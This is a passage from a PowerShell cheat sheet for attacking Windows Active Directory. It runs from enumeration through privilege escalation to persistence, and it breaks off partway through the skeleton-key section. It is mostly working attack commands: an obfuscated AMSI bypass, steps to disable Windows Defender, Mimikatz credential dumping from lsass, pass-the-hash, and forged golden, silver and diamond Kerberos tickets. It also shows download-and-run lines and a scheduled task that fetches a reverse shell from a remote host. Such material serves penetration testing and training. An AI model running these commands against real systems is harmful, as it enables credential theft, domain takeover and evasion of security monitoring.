![Title](images/title-ad.png 'Text')

This cheat sheet contains common enumeration and attack methods for Windows Active Directory with the use of powershell.

Last update: **02/Aug/2023**
## Table of Contents
- [Pre-requisites](#pre-requisites)
- [PowerShell AMSI Bypass](#PowerShell-AMSI-Bypass)
- [Windows Defender](#windows-defender)
- [Remote Desktop](#remote-desktop)
  -  [Enable Remote Desktop](#Enable-Remote-Desktop)
  -  [Login with remote desktop](#login-with-remote-desktop)
  -  [Login with remote desktop with folder sharing](#Login-with-remote-desktop-with-folder-sharing)
- [Enumeration](#enumeration)
  -  [Users Enumeration](#users-enumeration)
  -  [Domain Admins Enumeration](#domain-admins-enumeration)
  -  [Computers Enumeration](#computers-enumeration)
  -  [Groups and Members Enumeration](#groups-and-members-enumeration)
  -  [Shares Enumeration](#shares-enumeration) 
  -  [OUI and GPO Enumeration](#oui-and-gpo-enumeration) 
  -  [ACLs Enumeration](#acls-enumeration)
  -  [Domain Trust Mapping](#domain-trust-mapping)
  -  [Domain Forest Enumeration](#domain-forest-enumeration)
  -  [User Hunting](#user-hunting)
  -  [Enumeration with BloodHound](#enumeration-with-bloodhound)
     -  [Gui-graph Queries](#gui-graph-queries)
     -  [Console Queries](#console-queries)
- [Local Privilege Escalation](#local-privilege-escalation)
- [Lateral Movement](#lateral-movement)
- [Persistence](#persistence)
  -  [Golden Ticket](#golden-ticket)
  -  [Silver Ticket](#silver-ticket)
  -  [Diamond Ticket](#diamond-ticket)
  -  [Skeleton Key](#skeleton-key)
  -  [Directory Services Restore Mode (DSRM)](#directory-services-restore-mode-dsrm))
  -  [Custom-SSP](#Custom-SSP)
  -  [AdminSDHolder](#adminsdholder)
  -  [DCSync](#dcsync)
- [Privilege Escalation](#privilege-escalation)
  -  [Kerberoast](#kerberoast)
  -  [Targeted Kerberoasting AS REPs](#targeted-Kerberoasting-AS-REPs)
  -  [Targeted Kerberoasting Set SPN](#targeted-Kerberoasting-set-spn)
  -  [Kerberos Delegation](#kerberoast-delegation)
     -  [Unconstrained Delegation](#unconstrained-delegation)
        -  [Printer Bug](#printer-bug)
     -  [Constrained Delegation](#constrained-delegation)
  -  [Child to Parent using Trust Tickets](#Child-to-Parent-using-Trust-Tickets)
  -  [Child to Parent using Krbtgt Hash](#Child-to-Parent-using-krbtgt-hash)
  -  [Across Forest using Trust Tickets](#Across-forest-using-trust-tickets)
  -  [GenericAll Abused](#GenericAll-Abused)
- [Trust Abuse MSSQL Servers](#trust-abuse-mssql-servers)
- [Forest Persistence DCShadow](#Forest-Persistence-DCShadow)

## Tools and Scripts
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
  - [PowerView Tutorial](https://powersploit.readthedocs.io/en/latest/Recon/)
- [PowerView Dev](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [HeidiSQL Client](https://github.com/HeidiSQL/HeidiSQL)
- [AD Module](https://github.com/samratashok/ADModule)
- [PowerShell AMSI Bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [Neo4j - Community Version](https://neo4j.com/download-center/#community)
- [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
  - [SharpHound Tutorial](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [MS-RPRN](https://github.com/leechristensen/SpoolSample)
- [Kekeo](https://github.com/gentilkiwi/kekeo/)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz/)
- [Kerbrute](https://github.com/ropnop/kerbrute/)

## Pre-requisites
### Using PowerView:
```powershell
. .\PowerView.ps1
```

### Using PowerView dev:
```powershell
. .\PowerView_dev.ps1
```

### Using AD Module
```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1
```

# PowerShell AMSI Bypass
```powershell
# AMSI bypass
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

# PowerShell AMSI Evasion

```powershell
# Use AMSITrigger to find malicious lines in a script:
# amsitrigger64.exe -i PowerUp.ps1
# Result is: $AppDomain = [Reflection.Assembly].Assembly.GetType("Sytem.AppDomain").GetProperty('CurrentDomain').GetValue($null,@())
# The problem here is the "System.AppDomain" string which gets detected
# Use a reverse function to bypass like this:
$String = 'niamoDppA.metsyS'
$classrev= ([regex]::Matches($String.'RightToLeft') |  ForEach {$_.value}) -join ''
$AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null,@())
```

# Windows Defender

### Disable Windows Defender
```powershell
# Turn Off
Set-MpPreference -DisableRealtimeMonitoring $true
```
### Disable Windows Defender and delete signatures
```powershell
# Turn Off
"c:\Program Files\Windows Defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
```
**Example:**

![Main Logo](images/Example_Defender01.PNG 'ExampleDefender')

# Remote Desktop

### Enable Remote Desktop
```powershell
# Turn On
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

### Login with remote desktop
```bash
# Login
rdesktop 172.16.20.20 -d corporate -u username -p password
```

### Login with remote desktop with folder sharing 
```bash
# Login
rdesktop 172.16.20.20 -d corporate -u username -p password -r disk:sharename=//home/username/Desktop/Tools
```

### Login with xfreerdp
```bash
# Login
xfreerdp /u:username /p:password /v:172.16.20.20
```

### Login with xfreerdp with folder sharing 
```bash
# Login
xfreerdp /u:username /p:password /v:172.16.20.20 /drive:/home/username/Desktop/Tools
```

### Tools Invisi-Shell
```powershell
# Invisi-Shell  is powershell script that spawns a shell bypassing ScriptBlock logging, Module logging, Transcription, AMSI (by hooking .Net assemblies)
# Depending on privileges run one of the two:
RunWithPathAsAdmin.bat
RunWithRegistryNonAdmin.bat
```


# Enumeration

### Domain info Enumeration

- **With PowerView**:
```powershell
# Get the Domain information 
Get-Domain
# Get the Domain SID
Get-DomainSID
# Get another domain (trust neede)
Get-Domain -Domain other.domain.FQDN
# Get Domain policy for current domain (typically: password policy, Kerberos Policy and Domain Paths
Get-DomainPolicyData
# Get Domain policy for current domain
(Get-DomainPolicyData).systemaccess
# Get Domain policy for other domaincurrent domain
(Get-DomainPolicyData -Domain other.domain.FQDN).systemaccess
```

- **With AD Module**:
```powershell
# Get the Domain information 
Get-ADDomain
# Get the Domain SID
(Get-ADDomain).DomainSID
# Get another domain (trust neede)
Get-ADDomain -Identity other.domain.FQDN
```

### Users Enumeration

- **With PowerView**:
```powershell
# Get the list of users
Get-DomainUser

# Get User by username
Get-DomainUser -Identity user01

# Get User with Filter by description
Get-DomainUser -LDAPFilter "Description=*built*"

# Grab only some attributes of the user
Get-DomainUser -LDAPFilter "Description=*built*" | select name,description

# Get actively logged users on a computer (needs local admin rights on the target)
Get-NetLoggedon -ComputerName <hostname>
```
- **With AD Module**:
```powershell
# Get the list of users
Get-ADUser -Filter *
# Get the list of users with properties
Get-ADUser -Filter * -Properties *                                                                        
# List samaccountname and description for users
Get-ADUser -Filter * -Properties * | select Samaccountname,Description                                    
# Get the list of users from cn common-name
Get-ADUser -Filter * -Properties * | select cn                                                            
# Get the list of users from name
Get-ADUser -Filter * -Properties * | select name                                                          
# Displays when the password was set
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

### Computers Enumeration

- **With PowerView:**
```powershell
# Get the list of computers in the current domain
Get-DomainComputer

# Get the list of computers in the current domain with complete data 
Get-DomainComputer | Select name,operatingsystem

# Get the list of computers with operating system "Windows Server 2019"
Get-DomainComputer -OperatingSystem "Windows Server 2019*"

# Find all computer that are alive (use a ping, host firewall may generate false negative) 
Get-Domain -Ping                                 
```
- **With AD Module:**
```powershell
# Get the list of computers in the current domain 
Get-ADComputer -Filter * | select name

# Get the list of computers in the current domain with complete data 
Get-ADComputer -Filter * -properties * | select name

# Get the list of computers filtering by Operating system ("server 2019")
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2019*"' -properties * | select name,OperatingSystem   

# Get the list of computers grabbing their name
Get-ADComputer -Filter * | select Name                                               
```


### Groups and Members Enumeration

- **With PowerView:**
```powershell
# Information about groups
Get-NetGroup
# Get all groups that contain the word "admin" in the group name 
Get-NetGroup *Admin*                                                       
# Get all members of the "Domain Admins" group
Get-NetGroupMember -GroupName "Domain Admins" -Recurse                     
# Query the root domain as the "Enterprise Admins" group exists only in the root of a forest
Get-NetGroupMember -GroupName "Enterprise Admins" –Domain domainxxx.local  
# Get group membership for "user01"
Get-NetGroup -UserName "user01"                                            
```
- **With AD Module:**
```powershell
# Get all groups that contain the word "admin" in the group name
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name                   
# Get all members of the "Domain Admins" group
Get-ADGroupMember -Identity "Domain Admins" -Recursive                     
# Get group membership for "user01"
Get-ADPrincipalGroupMembership -Identity user01                            
```

### Shares Enumeration

- **With PowerView:**
```powershell
# Find shares on hosts in the current domain                   
Invoke-ShareFinder -Verbose                                             
# Find sensitive files on computers in the current domain
Invoke-FileFinder -Verbose                                              
# Search file servers. Lot of users use to be logged in this kind of server
Get-NetFileServer                                                       
# Find shares excluding standard, print and ipc.
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose
# Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess
# Find interesting shares in the domain, ignore default shares, and check access
Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess
```

### OUI and GPO Enumeration

- **With PowerView:**
```powershell

# Get the organizational units in a domain (Full Data)
Get-DomainOU

# Get the organizational units in a domain with name
Get-DomainOU | select name

# Get all computers from "Servers". From OU "Servers" -> DN attribute -> Get-DomainComputer  (works recursively)
(Get-DomainOU -Identity "Servers").distinguishedname | %{Get-DomainComputer -ADSpath $_}   | select name

# Get all users from "Employees". From OU "Employees" -> DN attribute -> Get-DomainUser
(Get-DomainOU -Identity "Employees").distinguishedname | %{Get-DomainUser -ADSpath $_}   | select name

# Retrieve the list of GPOs present in the current domain
Get-DomainGPO

# Retrieve the list of GPOs present in the current domain with displayname
Get-DomainGPO| select displayname

# Get list of GPO applied to a particular computer
Get-DomainGPO -ComputerName <ComputerName> | select displayname

# Get list of GPO applied to a particular user
Get-DomainGPO -UserName <UserName> | select displayname

# Find users who have local admin rights over the machine configured by a "Restricted groups" GPO
Find-GPOComputerAdmin –Computername <ComputerName>

# Get machines where the given user is member of a specific group "Restricted groups" GPO
Find-GPOLocation -Identity <user> -Verbose

# Enumerate GPO applied on a specific OU
# Get-DomainOU specifies an array of GPO names (GUID) applied in the "gplink" property
# This can be used to find the information of the GPO with Get-NetGPO
Get-DomainGPO -Name '{GUID_in_gplink}'                        

# Retrieve the GPOs that set "Restricted group" on a machine
Get-DomainGPOLocalGroup -ResolveMembersToSIDs

# Get Group policy settings for a specific computer
gpresult /R

```
- **With AD Module:**
```powershell
# Get the organizational units in a domain
Get-ADOrganizationalUnit -Filter * -Properties *                            
```

### ACLs Enumeration

- **With PowerView:**
```powershell

# Enumerates the ACLs for a specific object (in thisis case a user)
# ObjectDN is the target object
# IdentityRefernce is the usr (or group) that has specific righs on ObjectDN
# ActiveDirectoryRihts is the list of rights
# AccessControlType: Allow or deny the rights
Get-DomainObjectAcl -SamAccountName "username" -ResolveGUIDs                         

# Enumerates the ACLs for the Domain Admins group and select only useful data:
Get-DomainObjectAcl -SamAccountName "Domain admins" -ResolveGUIDs | select SecurityIdentifier,AceType,ActiveDirectoryRights

# Get the acl associated with a specific prefix
Get-DomainObjectAcl -SearchBase 'LDAP://CN=Domain admins,CN=Users,DC=domain,dc=local' -ResolveGUIDs -Verbose | select SecurityIdentifier,AceType,ActiveDirectoryRights

# In a real environment there can be many, many ACLs. Below a command to find only interesting (non default) ACLs
find-interestingDomainAcl -ResolveGUIDs
# More readable version                                       
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,AceType,ActiveDirectoryRights,IdentityReferenceName

# Find ACLs based on IdentityRefernce (useful to find what we can do as a user or a groupmember)
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "myusername"} 

# Show ACL for a network share (SYSVOL in the example)
 Get-PathAcl -Path "\\domain.local\sysvol"
```

### Domain Trust Mapping

- **With PowerView:**
```powershell
# Get the list of all trusts within the current domain
Get-DomainTrust
                     
# Get the list of all trusts within the indicated domain
Get-DomainTrust -Domain us.domain.corporation.local

# Get information of the current Forest
Get-Forest

# Get information of the indicated forest
Get-Forest -Forest eurocorp.local

# List all Domains in the current forest
Get-ForestDomain

# List all trust of the domains of the current forest
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name}

# List external trusts (TrusteAttributes == FILTER_SIDS)
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

# Get Global Catalogs in the current Forest
Get-ForestGlobalCatalog

# Map all forest trust
Get-ForestTrust
```
**Example:**

![Main Logo](images/Example_trust01.PNG 'Example01')

- **With AD Module:**
```powershell
# Get the list of all trusts within the current domain
Get-ADTrust -Filter *                                                       
# Get the list of all trusts within the indicated domain
Get-ADTrust -Identity us.domain.corporation.local                           
```

**Example:**

![Main Logo](images/Example_trust02.PNG 'Example02')


### User Hunting

- **With PowerView:**
```powershell

# Find all machines on the current domain where the current user has local admin access
# Use Get-NetComputer to retrieve list of computers and then Invoke-CheckLocalAdminAccess onto each machine
# Alternative: Find-WMILocalAdminAccess
Find-LocalAdminAccess -Verbose

# Find local admins on all machines of the domain
Find-DomainLocalGroupMember -Verbose

# Enumerates the local group memberships for all reachable machines the <domain>
Find-DomainLocalGroupMember -Domain <domain>

# Looks for machines where a domain administrator (or specified user/groups) is logged on
# It enumerates users and computers, then use Get-NetSession and Get-NetLoggedon to find sessions
FindDomainUserLocation -Verbose
FindDomainUserLocation -UserGroupIdentity "RDPUsers"

# Confirm access to the machine as an administrator
Invoke-UserHunter -CheckAccess                                    
```

### Enumeration with BloodHound

#### Pre-requisites
#### Neo4j:
Link: [Neo4j - Community Version](https://neo4j.com/download-center/#community)
#### SharpHound:
Link: [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
#### BloodHound:
Link: [BloodHound](https://github.com/BloodHoundAD/BloodHound)

![Title](images/bloodhound.png 'bloodhound')

**1. Install and start the neo4j service:**
```powershell
# Install the service
.\neo4j.bat install-service
# Start the service
.\neo4j.bat start
```

**2. Run BloodHound ingestores to gather data and information about the current domain:**
```powershell
# Gather data and information
. .\SharpHound.exe --CollectionMethod All
# Gather data and information
Invoke-BloodHound -CollectionMethod All -Verbose
# Remove noisy collection mehods (RDP, DCOM, PSremote..)
Invoke-BloodHound --stealth
# Don't query the DC, more stealth but can miss some information
Invoke-BloodHound --ExcludeDCs
# Useful GUI features:
- Derivative Local Admin Rights
- Transitive Object control 
# These features are not working proerly in the latest version of Bloodhound, please use Bloodhound_4.0.3_old
```

### Gui-Graph Queries
```
# Find All edges any owned user has on a computer
match p=shortestPath((m:User)-[r]->(b:Computer)) WHERE m.owned RETURN p
# Find All Users with an SPN/Find all Kerberoastable Users
match (n:User)WHERE n.hasspn=true
# Find workstations a user can RDP into
match p=(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS WITH '-513'  AND NOT c.operatingsystem CONTAINS 'Server' return p
# Find servers a user can RDP into
match p=(g:Group)-[:CanRDP]->(c:Computer) where  g.objectid ENDS WITH '-513'  AND c.operatingsystem CONTAINS 'Server' return p
# Find all computers with Unconstrained Delegation
match (c:Computer {unconstraineddelegation:true}) return c
# Find users that logged in within the last 30 days
match (u:User) WHERE u.lastlogon < (datetime().epochseconds - (30 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] return u
# Find all sessions any user in a specific domain
match p=(m:Computer)-[r:HasSession]->(n:User {domain: "corporate.local"}) RETURN p
# Find the active user sessions on all domain computers
match p1=shortestPath(((u1:User)-[r1:MemberOf*1..]->(g1:Group))) MATCH p2=(c:Computer)-[*1]->(u1) return p2
# View all groups that contain the word 'administrators'
match (n:Group) WHERE n.name CONTAINS "administrators" return n
# Find if unprivileged users have rights to add members into groups
match (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) return p
```

### Console Queries
```
# Find what groups can RDP
match p=(m:Group)-[r:CanRDP]->(n:Computer) RETURN m.name, n.name ORDER BY m.name
# Find what groups can reset passwords 
match p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN m.name, n.name ORDER BY m.name
# Find what groups have local admin rights
match p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name
# Find all connections to a different domain/forest
match (n)-[r]->(m) WHERE NOT n.domain = m.domain RETURN LABELS(n)[0],n.name,TYPE(r),LABELS(m)[0],m.name
# Kerberoastable Users with most privileges
match (u:User {hasspn:true}) OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer) OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer) WITH u,COLLECT(c1) + COLLECT(c2) AS tempVar UNWIND tempVar AS comps RETURN u.name,COUNT(DISTINCT(comps)) ORDER BY COUNT(DISTINCT(comps)) DESC
# Find users that logged in within the last 30 days
match (u:User) WHERE u.lastlogon < (datetime().epochseconds - (30 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u.name, u.lastlogon order by u.lastlogon
# Find constrained delegation
match (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u.name,COUNT(c) ORDER BY COUNT(c) DESC
# Enumerate all properties
match (n:Computer) return properties(n)
```

# Local Privilege Escalation

```powershell
# Typical ways
# - MIssing patches
# - Autologn
# - AlwaysInstallElevated
# - Misconfigured Services
# - DLL Hijacking
# - NTLM Relay
# etc...
```

### Using PowerUp:
```powershell
. .\PowerUp.ps1
```
Link: [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
### BeRoot
```powershell
.\beRoot.exe
```
Link: [BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
### PrivEsc
```powershell
. .\privesc.ps1
```
Link: [PrivEsc](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)

- **With PowerUp:**
```powershell
# Performs all checks
Invoke-AllChecks                                                         

# Get services with unquoted paths and a space in their name
Get-ServiceUnquoted -Verbose                                             

# Get services where the current user can write to its binary path or change arguments to the binary
Get-ModifiableServiceFile -Verbose                                       

# Get the services whose configuration current user can modify
Get-ModifiableService -Verbose                                           

# This command abuses service "SVC_xxx" to create a user john with password "Password123!" and add it to local admin group
Invoke-ServiceAbuse -Name 'SVC_xxx'

# This command abuses service "SVC_xxx" to change and existing users adding it to local admin group
Invoke-ServiceAbuse -Name 'SVC_xxx' -UserName 'corporate\student01'

```

- **With PrivEsc:**
```powershell
# Performs all checks
Invoke-Privesc                                        
```

# Lateral Movement

- **Powershell Remoting:**
```powershell

# Execute whoami & hostname commands on the indicated server
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          

# Execute he script Get-PassHashes.ps1 on the indicated server (the script must be present on the remote computer)
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local

# If the script is already loaded, just execute the function:
Invoke-Command -ScriptBlock {function:Get-PassHashes} -ComputerName xxxx.corporate.corp.local          

# Massive execution (very noisy)
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# Enable Powershell Remoting on current Machine
Enable-PSRemoting

# Start a new session and enter it:
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession $sess

# Start a new session
Enter-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName -Sessions $sess

# External script that find machines in the domain the current user has local admin access to
Find-PSRemotingLocalAdminAccess
```

- **Winrs and winrm.vbs:**
```powershell
# winrs can be used in place of PSRemoting 
winrs -r:hostname -u:domain\user 
```

- **Lateral movement with Invoke-Mimikatz:**
```powershell
# Extract credentials from lsass
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)
# "Over pass the hash" generate tokens from hashes
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'


# Useful alternatives (less detected using alternative DLLs)
SafetyKatz.exe "sekurlsa::ekeys"
SharpKatz.exe --Command ekeys
rundll32.exe OutFlank-Dumpert.dll,Dump
Pypykatz.exe live lsa
rundll32.exe c:\windows\system32\comsvcs.dll,MiniDump <Lsass_PID> c:\temp\lsass.dmp full 
impacket (from Linux)
Physmem2profit (from Linux)

# Over-pass-the-hash (OPTH):  Requires access to joined machine but can use AES keys to generate Kerberos Token
# spawns a powershell session (logontype=9, like runas /netonly)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes256Key> /run:powershell.exe"'
Safetykatz.exe "sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes256Key> /run:cmd.exe" "exit"
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt

# Pass-the-Hash (pth): can be done by non joined machine but requires NTLM hash and doesn't create Kerberos
# Doesn't work if the domain is configured to not accept NTLM authentication
```

- **Lateral movement with .NET Tools:**
```powershell
# Better than powershell but still detected by AV/EDR. There are two main problems here:
1. Prevent detection by obfuscation
2. Find a way to deliver the payload without getting caught
```

- *Obfuscation*
```powershell
# Evasion is usually done by
- compile the source
- use Defendercheck.exe to identify detected strings
- find a way to replace the malicious strings with a safer version ("Credentials" -> "Credents", etc...)
- Compile and repeat the procedure

# Some examples of obfuscation:

# Out-CompressedDll.ps1 can help to generate a base64 representtaion of DLL or an EXE
# Can be used to embed mimikatz into SafetyKatz
Out-CompressedDll mimikatz.exe > output.txt
# Paste it into Costant.cs and compile as SafetyKatz

# BettersafetyKatz:
# get the mimikatz binary code from github and unzip it in RAM
# use defendercheck on it and patches the detected strings
# Then use Sharpsploit DInvoke API to load the patched DLL into Memory

# ConfuserEX can be used to obfuscate Rubeus
```

- *Payload Delivery*
```powershell
# A tool called Netloader can be used to patch AMSI & EWT (Event Viewer)
c:\tools\Loader.exe -path http://x.x.x.x/SafetyKatz.exe

# If loader.exe gets caught it's possible to use AssemblyLoad.exe to load loader.exe from network
 c:\tools\AssemblyLoad.exe http://x.x.x.x/Loader.exe -path http://x.x.x.x/SafetyKatz.exe
```

- *Example of usage*
```powershell
# First, setup a HTTP server (apache or HFS) on x.x.x.x with useful binaries

# Download AMSI bypass string 
iex(iwr http://x.x.x.x/sbloggingbypass.txt -UseBasicParsing)

# Execute AMSI bypass
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# Download powerview
iex((New-Object Net.WebClient).DownloadString('http://x.x.x.x/PowervIew.ps1'))

# Connect to other machine and execute commands
winrs -r:server hostname;whoami

# Download Loader.exe
iwr http://x.x.x.x/Loader.exe -OutFile c:\users\Public\Loader.exe

#Copy Loader.exe to server (using c$)
echo F | xcopy c:\users\Public\Loader.exe \\server\c$\users\Public\Loader.exe

# Setup a proxy from server (port 8080) to HTTP Server x.x.x.x port 80
# This can be useful to execute the AssemblyLoad and Loader chain ($null is piped to end the winrs session)
$null | winrs -r:server "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x"

# Then execute Loader connecting to localhost (which is forwarded), downaload safetykatz and execute sekurlsa::ekeys command
$null | winrs -r:server c:\users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit

# This expose an admin user AES key for over-pass-the-hash
Rubeus.exe asktgt /user:svcadmin /aes256:<AESKeys> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
# Keep in mind that even if whoami shows a non elevated user, the session has svcadmin permissions (logontype=9)
# and can be used to remote execute command
winrs -r server cmd
```


# Persistence

### Golden Ticket

- **Invoke-Mimikatz:**
```powershell
# Execute mimikatz on DC as DA to get hashes (especially the krbtgt hash)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
# Or use DCSync with SafetyKatz (this doesn't execute anything on DC and requires just permssion of AD replication, not full 
SafetyKatz "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Golden Ticket: use the hash from krbtgt to impersonate Administrator using pass-the-ticket technique). 
# Works until krbtgt password is changed two times. Ticket is valid for 10800 minutes (7 days). Can be more (10 years)
# It can impersonate any user in domain, not only administrator
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /aes256:XXX /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
# Or
BetterSafetyKatz "kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /aes256:XXX  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
# Instead of /ptt (which passes the ticket to the interactive session), /ticket can be used to save the ticket to a file (to be reused)

```


### Silver Ticket

```powershell
# Silver ticket is about Service Acccounts (SPN) and TGS
# It needs the Hash of the SPN (AES Key)
# if a machine is compromised, it's possible to get its own account hash (in this case the persistence is valid for 30 days, he rotation period of computer account password)
# Since the PAC is usually not verified it's possible to impersonate various service account having computer account hash
# TGS owned    -> Service usable
# HOST                         ->  scheduled task
# HOST + RPPCSS                ->  Wmi
# HOST + HTTP                  -> WinRM
# HOST + HTTP +(WSMAN + RPCSS) -> WinRM
# RPCSS + LDAP + CIFS          -> Windows RSAT

Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
BetterSafetyKatz "kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

```
```
# Create a Scheduled task "STCheck" (download and execute a Powershell - Specifically a reverse shell)
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8000/InvokePowershellTcp.ps1''')'"
```
```
# Execute Scheduled task (download and execute a Powershell - Specifically a reverse shell)
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
```

### Diamond Ticket

```powershell
# Diamond ticket is an alternative to Golden Ticket.
# Golden ticket use krbtgt hash to create a new TGT for persistence
# Diamond ticket modifies a valid TGT (decrypt,change,re-encrypt) with the AES key of krbtgt
# It is less detected because:
# TGT has valid ticket times
# It has a corresponding TGS (while a Golden ticket is forged and not linked to any TGS)

# It requires credentials if used by non domain account
Rubeus.exe diamond /krbkey:<AES_krbtgt> /user:studentx /password:studentPassword /enctype:aes /ticketusr:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /Createnetonly:c:\windows\system32\cmd.exe /show /ptt

# if a domain account is available, use the /tgtdeleg 
Rubeus.exe diamond /krbkey:<AES_krbtgt> /tgtdeleg /enctype:aes /ticketusr:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /Createnetonly:c:\windows\system32\cmd.exe /show /ptt

```

### Skeleton Key

- **Invoke-Mimikatz:**
```powershell
# Idea is to patch the DC memory injecting a domain admin credential
# By default it's user: mimikatz and password: mimikatz
# It doesn't survive a reboot
# It may not work if autenticathion is done against another DC (when having multiple DCs)
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.corporate.corp.local

# Not recommended method because not opsec safe and can cause issues to AD CS
# In case lsass is a protected process, mimikatz exe and driver are needed:
mimikatz#  privilege::debug
